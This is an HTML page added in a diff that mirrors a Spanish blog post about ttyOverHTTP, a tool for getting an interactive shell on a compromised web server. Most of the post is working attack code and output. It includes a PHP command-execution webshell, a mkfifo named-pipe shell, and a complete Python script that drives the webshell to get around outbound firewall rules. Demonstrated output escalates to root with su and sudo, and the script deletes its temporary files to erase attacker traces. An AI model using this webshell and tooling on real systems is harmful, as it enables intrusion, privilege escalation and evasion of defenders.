@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ttyOverHTTP - Herramienta // gh0stnet</title>
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #080808; --bg2: #0d0d0d; --border: #1a1a1a;
+      --cyan: #00fff0; --cyan-dim: rgba(0,255,240,0.15);
+      --text: #c8c8c8; --text-dim: #555; --red: #ff2e2e; --white: #e8e8e8;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: var(--bg); color: var(--text); font-family: 'Share Tech Mono', monospace;
+      font-size: 13px; line-height: 1.7; min-height: 100vh; cursor: crosshair; }
+    body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.08) 2px, rgba(0,0,0,0.08) 4px);
+      pointer-events: none; z-index: 9999; }
+    body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.025;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 9998; }
+    .container { max-width: 860px; margin: 0 auto; padding: 0 24px; }
+    header { border-bottom: 1px solid var(--border); padding: 20px 0; position: sticky; top: 0;
+      background: rgba(8,8,8,0.95); backdrop-filter: blur(8px); z-index: 100; }
+    header .container { display: flex; align-items: center; justify-content: space-between; }
+    .logo { font-family: 'VT323', monospace; font-size: 28px; color: var(--cyan);
+      text-shadow: 0 0 20px var(--cyan), 0 0 40px rgba(0,255,240,0.3); text-decoration: none; letter-spacing: 2px; }
+    .logo span { color: var(--text-dim); }
+    nav { display: flex; gap: 24px; }
+    nav a { color: var(--text-dim); text-decoration: none; font-size: 12px; letter-spacing: 1px;
+      transition: color 0.2s; text-transform: uppercase; }
+    nav a:hover, nav a.active { color: var(--cyan); }
+    .status-bar { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 6px 0;
+      font-size: 11px; color: var(--text-dim); overflow: hidden; }
+    .status-bar .container { display: flex; gap: 32px; align-items: center; }
+    .status-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--cyan);
+      display: inline-block; margin-right: 6px; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%, 100% { opacity: 1; box-shadow: 0 0 4px var(--cyan); } 50% { opacity: 0.4; box-shadow: none; } }
+
+    /* POST PAGE */
+    .post-head { padding: 56px 0 28px; border-bottom: 1px solid var(--border); }
+    .post-meta { font-size: 11px; color: var(--cyan); letter-spacing: 3px; text-transform: uppercase; margin-bottom: 16px; }
+    .post-meta .sep { color: var(--text-dim); margin: 0 8px; }
+    .post-head h1 { font-family: 'VT323', monospace; font-size: 48px; color: var(--white); line-height: 1.05; font-weight: normal; }
+    .credit { background: var(--bg2); border: 1px solid var(--border); border-left: 2px solid var(--cyan);
+      margin: 28px 0 8px; padding: 12px 16px; font-size: 11px; color: var(--text-dim); letter-spacing: 1px; }
+    .credit a { color: var(--cyan); text-decoration: none; }
+    .credit a:hover { text-shadow: 0 0 10px var(--cyan); }
+    article { padding: 32px 0 20px; }
+    article h1, article h2, article h3, article h4 { font-family: 'VT323', monospace; color: var(--cyan);
+      font-weight: normal; line-height: 1.1; margin: 36px 0 14px; }
+    article h1 { font-size: 36px; } article h2 { font-size: 30px; } article h3 { font-size: 25px; } article h4 { font-size: 21px; }
+    article p, article ul, article ol, article table, article pre, article blockquote { margin-bottom: 18px; }
+    article ul, article ol { padding-left: 24px; }
+    article a { color: var(--cyan); text-decoration: none; border-bottom: 1px solid var(--cyan-dim); }
+    article a:hover { border-bottom-color: var(--cyan); }
+    article strong { color: var(--white); }
+    article code { color: var(--cyan); background: var(--bg2); padding: 1px 5px; font-family: 'Share Tech Mono', monospace; }
+    article pre { background: var(--bg2); border: 1px solid var(--border); border-top: 2px solid var(--cyan);
+      padding: 16px 20px; overflow-x: auto; font-size: 12px; line-height: 1.8; }
+    article pre code { background: none; padding: 0; color: var(--text); }
+    article img, article video { max-width: 100%; height: auto; border: 1px solid var(--border); display: block; margin: 18px 0; }
+    article blockquote { border-left: 2px solid var(--text-dim); padding-left: 16px; color: var(--text-dim); }
+    article table { border-collapse: collapse; display: block; overflow-x: auto; }
+    article td, article th { border: 1px solid var(--border); padding: 6px 12px; }
+    article th { color: var(--cyan); text-align: left; }
+    article hr { border: 0; border-top: 1px solid var(--border); margin: 32px 0; }
+    .back { display: inline-block; margin: 8px 0 40px; font-size: 11px; letter-spacing: 2px; text-transform: uppercase;
+      color: var(--text-dim); text-decoration: none; }
+    .back:hover { color: var(--cyan); }
+
+    footer { border-top: 1px solid var(--border); padding: 32px 0; margin-top: 40px; }
+    footer .container { display: flex; justify-content: space-between; align-items: center; }
+    .footer-left, .footer-right { font-size: 11px; color: var(--text-dim); }
+    .footer-right span { color: var(--cyan); }
+    .logo:hover { animation: glitch 0.3s infinite; }
+    @keyframes glitch {
+      0% { text-shadow: 0 0 20px var(--cyan), 2px 0 var(--red), -2px 0 var(--cyan); }
+      25% { text-shadow: 0 0 20px var(--cyan), -2px 0 var(--red), 2px 0 var(--cyan); }
+      50% { text-shadow: 0 0 20px var(--cyan), 2px 2px var(--red), -2px -2px var(--cyan); }
+      75% { text-shadow: 0 0 20px var(--cyan), -2px 2px var(--red), 2px -2px var(--cyan); }
+      100% { text-shadow: 0 0 20px var(--cyan), 0 0 var(--red), 0 0 var(--cyan); }
+    }
+    @media (max-width: 600px) {
+      .post-head h1 { font-size: 36px; } nav { gap: 16px; }
+      footer .container { flex-direction: column; gap: 8px; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container">
+      <a href="/" class="logo">gh<span>0</span>stnet<span>_</span></a>
+      <nav>
+        <a href="/" class="active">feed</a>
+        <a href="/about">about</a>
+        <a href="/ops">ops</a>
+        <a href="/bugbounty">disclosures</a>
+      </nav>
+    </div>
+  </header>
+  <div class="status-bar">
+    <div class="container">
+      <span><span class="status-dot"></span>systems nominal</span>
+      <span>// gh0stnet0.github.io</span>
+    </div>
+  </div>
+  <main>
+    <div class="container">
+      <section class="post-head">
+        <div class="post-meta">2020.02.04<span class="sep">//</span>scripting</div>
+        <h1>ttyOverHTTP - Herramienta</h1>
+        <div class="credit">// archive mirror &mdash; originally published by <a href="https://s4vitar.github.io">S4vitar</a> on 2020-02-04. reposted with the author's permission.</div>
+      </section>
+      <article>
+<p><img src="/posts/img/ttyOverHTTP/linux-banner.png" /></p>
+<p>Podéis encontrar esta herramienta en el siguiente enlace:</p>
+<ul>
+<li><a href="https://github.com/s4vitar/ttyoverhttp"><span>https://github.com/s4vitar/ttyoverhttp</span></a></li>
+</ul>
+<h2 id="qué-es-ttyoverhttp">¿Qué es ttyOverHTTP?</h2>
+<p><strong>ttyOverHTTP</strong> no es más que una herramienta de utilidad la cual nos permitirá en base a una webshell, sin la necesidad de entablarnos una reverse shell, contar con una TTY completamente interactiva, haciendo uso para ello de la utilidad <code>mkfifo</code>.</p>
+<p>Para los que no entiendan la problemática de las webshells, podéis probarlo por vuestra cuenta... simplemente montad un servidor apache y alojad este recurso PHP en la ruta <code>/var/www/html/cmd.php</code>:</p>
+<pre class="php"><code>&lt;?php
+    echo shell_exec($_REQUEST[&#39;cmd&#39;]);
+?&gt;</code></pre>
+<p>Como es de esperar, a través de la variable <code>cmd</code> está más que claro que vamos a ser capaces de ejecutar comandos a nivel de sistema como el usuario <code>www-data</code>:</p>
+<p align="center">
+<img src="/posts/img/ttyOverHTTP/first-webserver.png">
+</p>
+
+<p>Sin embargo, fijaros qué es lo que pasa si tratamos por ejemplo de efectuar una migración de usuario:</p>
+<p align="center">
+<img src="/posts/img/ttyOverHTTP/second-webserver.png">
+</p>
+
+<p>No podemos introducir la contraseña del usuario <code>root</code>, cosa que podríamos hacer si hiciéramos un tratamiento de la TTY desde consola, ya sabéis... el <code>stty raw -echo</code> y toda la movida.</p>
+<p>De la misma forma, tampoco podemos correr desde una webshell el servicio <code>mysql</code> o <code>php</code> en modo interactivo, ni hacer un <code>sudo su</code> para introducir la contraseña. Tampoco podemos hacer desplazamientos entre directorios, me refiero... si hacemos <code>pwd</code> veremos la ruta actual en la que nos situamos, pero si luego enviamos un <code>cd /home</code> y volvemos en la siguiente consulta a hacer un <code>pwd</code> veremos que seguiremos en el mismo directorio inicial, no habiéndose efectuado el desplazamiento.</p>
+<p>Todo esto sucede porque básicamente no estamos en una TTY, podemos comprobarlo de la siguiente forma:</p>
+<p align="center">
+<img src="/posts/img/ttyOverHTTP/third-webserver.png">
+</p>
+
+<p>Entonces bien, ¿qué hacemos en estos casos?, porque si nos entabláramos una Reverse Shell obviamente ya todo estaría hecho, ¿pero y si por iptables hay ciertas reglas configuradas tanto por ipv4 como por ipv6 que impiden conexiones salientes para entablarnos nuestra conexión?.</p>
+<p>Efectivamente, se nos complica un poco la labor.</p>
+<h2 id="movimiento-lateral">Movimiento lateral</h2>
+<p>En Linux, hay una utilidad que nos permite crear archivos <strong>FIFO</strong>. Un fichero FIFO es similar a una interconexión o tubería, excepto en que se crea de una forma distinta. En vez de ser un canal de comunicaciones anónimo, un fichero especial FIFO se mete en el sistema de ficheros mediante una llamada a <strong>mkfifo</strong>.</p>
+<p>Veamos un ejemplo práctico de su uso. Por un lado desde terminal, haremos lo siguiente:</p>
+<pre class="go"><code>┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $mkfifo input; tail -f input | /bin/sh 2&gt;&amp;1 &gt; output</code></pre>
+<p>Esto se quedará en escucha, por lo que posteriormente deberemos abrir una nueva consola aparte para hacer las pruebas. Ahora haremos lo siguiente:</p>
+<pre class="go"><code>┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $ls
+input  output
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;whoami&quot; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $cat output 
+s4vitar
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;pwd&quot; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;cd ..&quot; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;pwd&quot; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $cat output 
+s4vitar
+/home/s4vitar/Desktop/example
+/home/s4vitar/Desktop</code></pre>
+<p>Si os fijáis, para cada comando proporcionado en <code>input</code>, se nos lista el resultado del comando aplicado a nivel de sistema en el fichero <code>output</code>.</p>
+<p>Ojo cuidado, esto sigue sin ser una TTY, sin embargo... podemos hacer lo siguiente:</p>
+<pre class="go"><code>┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;script /dev/null -c bash&quot; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $cat output 
+s4vitar
+/home/s4vitar/Desktop/example
+/home/s4vitar/Desktop
+Script started, file is /dev/null
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $</code></pre>
+<p>Fijaros cómo ahora se nos abre una consola aparte de la nuestra al leer el ficherito <code>output</code>. Tal vez lo veis mejor así:</p>
+<pre class="go"><code>┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $cat output; echo
+s4vitar
+/home/s4vitar/Desktop/example
+/home/s4vitar/Desktop
+Script started, file is /dev/null
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $</code></pre>
+<p>Ahí está. La superior a la de abajo del todo es la gestionada desde los ficheros <code>input</code> y <code>output</code>. ¿Qué es lo mejor de todo?, lo siguiente:</p>
+<pre class="go"><code>┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;tty&quot; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $cat output; echo
+s4vitar
+/home/s4vitar/Desktop/example
+/home/s4vitar/Desktop
+Script started, file is /dev/null
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $tty
+/dev/pts/4
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $</code></pre>
+<p>Ya estamos en una TTY, y a partir de aquí es sencillo aprovechar al máximo las utilidades de consola:</p>
+<pre class="go"><code>┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;php --interactive&quot; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &#39;$word = &quot;Hola&quot;;&#39; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &#39;echo $word;&#39; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &#39;quit&#39; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &#39;whoami&#39; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $cat output
+s4vitar
+/home/s4vitar/Desktop/example
+/home/s4vitar/Desktop
+Script started, file is /dev/null
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $tty
+/dev/pts/4
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $php --interactive
+Interactive mode enabled
+
+php &gt; $word = &quot;Hola&quot;;
+php &gt; echo $word;
+Hola
+php &gt; quit
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $whoami
+s4vitar
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $</code></pre>
+<p>De igual manera, podemos efectuar migraciones de usuario o convertirnos en root proporcionando la contraseña:</p>
+<pre class="go"><code>─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;sudo su&quot; &gt; input
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $echo &quot;************&quot; &gt; input # Aquí pondríais vuestra contraseña
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $cat output ; echo
+s4vitar
+/home/s4vitar/Desktop/example
+/home/s4vitar/Desktop
+Script started, file is /dev/null
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $tty
+/dev/pts/4
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $php --interactive
+Interactive mode enabled
+
+php &gt; $word = &quot;Hola&quot;;
+php &gt; echo $word;
+Hola
+php &gt; quit
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $whoami
+s4vitar
+┌─[s4vitar@parrot]─[~/Desktop]
+└──╼ $sudo su
+[sudo] password for s4vitar: 
+┌─[root@parrot]─[~/Desktop]
+└──╼ #
+┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $</code></pre>
+<p>El único problema es que el fichero <code>output</code> va almacenando el resultado de los comandos anteriormente ejecutados desde consola introducidos en <code>input</code>, por lo que por cada vez que abramos el <code>output</code>, veremos este histórico.</p>
+<p>Aún así, está todo pensado... no os preocupéis. ¿Cuál es la idea ahora?, pues aprovechar este principio para construir una utilidad en Python la cual nos permita comunicarnos, mediante la webshell previamente creada, con estos ficheritos <code>input</code> y <code>output</code> depositados sobre el sistema víctima explotando para ello la utilidad <code>mkfifo</code>.</p>
+<p>Haríamos uso de la siguiente utilidad en Python3:</p>
+<pre class="python"><code>#!/usr/bin/python3
+
+import requests, time, threading, pdb, signal, sys
+from base64 import b64encode
+from random import randrange
+
+class AllTheReads(object):
+    def __init__(self, interval=1):
+        self.interval = interval
+        thread = threading.Thread(target=self.run, args=())
+        thread.daemon = True
+        thread.start()
+
+    def run(self):
+        readoutput = &quot;&quot;&quot;/bin/cat %s&quot;&quot;&quot; % (stdout)
+        clearoutput = &quot;&quot;&quot;echo &#39;&#39; &gt; %s&quot;&quot;&quot; % (stdout)
+        while True:
+            output = RunCmd(readoutput)
+            if output:
+                RunCmd(clearoutput)
+                print(output)
+            time.sleep(self.interval)
+
+def RunCmd(cmd):
+    cmd = cmd.encode(&#39;utf-8&#39;)
+    cmd = b64encode(cmd).decode(&#39;utf-8&#39;)
+    payload = {
+            &#39;cmd&#39; : &#39;echo &quot;%s&quot; | base64 -d | sh&#39; %(cmd)
+        }
+    result = (requests.get(&#39;http://127.0.0.1/cmd.php&#39;, params=payload, timeout=5).text).strip()
+    return result
+
+def WriteCmd(cmd):
+    cmd = cmd.encode(&#39;utf-8&#39;)
+    cmd = b64encode(cmd).decode(&#39;utf-8&#39;)
+    payload = {
+        &#39;cmd&#39; : &#39;echo &quot;%s&quot; | base64 -d &gt; %s&#39; % (cmd, stdin)
+    }
+    result = (requests.get(&#39;http://127.0.0.1/cmd.php&#39;, params=payload, timeout=5).text).strip()
+    return result
+
+def ReadCmd():
+        GetOutput = &quot;&quot;&quot;/bin/cat %s&quot;&quot;&quot; % (stdout)
+        output = RunCmd(GetOutput)
+        return output
+
+def SetupShell():
+    NamedPipes = &quot;&quot;&quot;mkfifo %s; tail -f %s | /bin/sh 2&gt;&amp;1 &gt; %s&quot;&quot;&quot; % (stdin, stdin, stdout)
+    try:
+        RunCmd(NamedPipes)
+    except:
+        None
+    return None
+
+global stdin, stdout
+session = randrange(1000, 9999)
+stdin = &quot;/dev/shm/input.%s&quot; % (session)
+stdout = &quot;/dev/shm/output.%s&quot; % (session)
+erasestdin = &quot;&quot;&quot;/bin/rm %s&quot;&quot;&quot; % (stdin)
+erasestdout = &quot;&quot;&quot;/bin/rm %s&quot;&quot;&quot; % (stdout)
+
+SetupShell()
+
+ReadingTheThings = AllTheReads()
+
+def sig_handler(sig, frame):
+    print(&quot;\n\n[*] Exiting...\n&quot;)
+    print(&quot;[*] Removing files...\n&quot;)
+    RunCmd(erasestdin)
+    RunCmd(erasestdout)
+    print(&quot;[*] All files have been deleted\n&quot;)
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, sig_handler)
+
+while True:
+    cmd = input(&quot;&gt; &quot;)
+    WriteCmd(cmd + &quot;\n&quot;)
+    time.sleep(1.1)</code></pre>
+<ul>
+<li><strong>Importante</strong>: En este caso estamos tirando contra la <code>127.0.0.1</code> suponiendo que el fichero se llama <code>cmd.php</code>, en vuestro caso lo tendréis que cambiar a lo que os toque.</li>
+</ul>
+<p>Entonces bien, imaginad que ya tenéis un archivo <code>cmd.php</code> alojado en el servidor víctima, pues mirad que sencillo:</p>
+<pre class="go"><code>┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $python3 ttyOverHTTP.py 
+&gt; whoami
+www-data
+&gt; pwd
+/var/www/html
+&gt; cd /home
+&gt; pwd
+/home
+&gt; ls -l
+total 0
+drwxr-xr-x 1 s4vitar s4vitar 1156 Feb  4 12:19 s4vitar</code></pre>
+<p>Ya directamente se gestiona desde el script la sesión, pudiendo así ver los outputs de los comandos que especifiquemos desde <code>input</code>.</p>
+<p>El procedimiento ahora para obtener una TTY y proseguir naturalmente sería el mismo que os mostré anteriormente:</p>
+<pre class="go"><code>┌─[s4vitar@parrot]─[~/Desktop/example]
+└──╼ $python3 ttyOverHTTP.py 
+&gt; whoami                  
+www-data
+&gt; script /dev/null -c bash
+Script started, file is /dev/null
+www-data@parrot:/var/www/html$
+&gt; su s4vitar
+su s4vitar
+Password:
+&gt; ************* # Aquí va vuestra contraseña
+
+░▒▓    /var/w/html  ✔ ▓▒░                                                  
+&gt; bash
+bash
+┌──[s4vitar@parrot]─[/var/www/html]
+└──╼ $
+&gt; whoami
+whoami
+s4vitar
+┌──[s4vitar@parrot]─[/var/www/html]
+└──╼ $
+&gt; sudo su
+sudo su
+[sudo] password for s4vitar:
+&gt; *********** # Aquí va vuestra contraseña
+
+░▒▓    /var/w/html  ✔   ▓▒░                                                
+bash
+bash
+┌──[root@parrot]─[/var/www/html]
+└──╼ #
+&gt; whoami
+whoami
+root
+┌──[root@parrot]─[/var/www/html]
+└──╼ #
+&gt; </code></pre>
+<p>Como podréis comprobar, tenemos una TTY completamente interactiva, pudiendo hacer todo lo que haríamos desde consola pero gestionado todo a través de una webshell. Y cómo no... no nos hemos entablado una Reverse Shell, buena esa.</p>
+<p>Si presionáis la tecla <code>Ctrl+C</code>, se eliminarán todos los ficheros temporales del sistema víctima creados para gestionar la sesión, limpiando así el rastro que como atacantes estamos dejando bajo la ruta <code>/dev/shm/</code>.</p>
+
+      </article>
+      <a href="/" class="back">&larr; back to feed</a>
+    </div>
+  </main>
+  <footer>
+    <div class="container">
+      <div class="footer-left">gh0stnet // gh0stnet0.github.io</div>
+      <div class="footer-right"><span>silence</span> is not absence. silence is control.</div>
+    </div>
+  </footer>
+</body>
+</html>
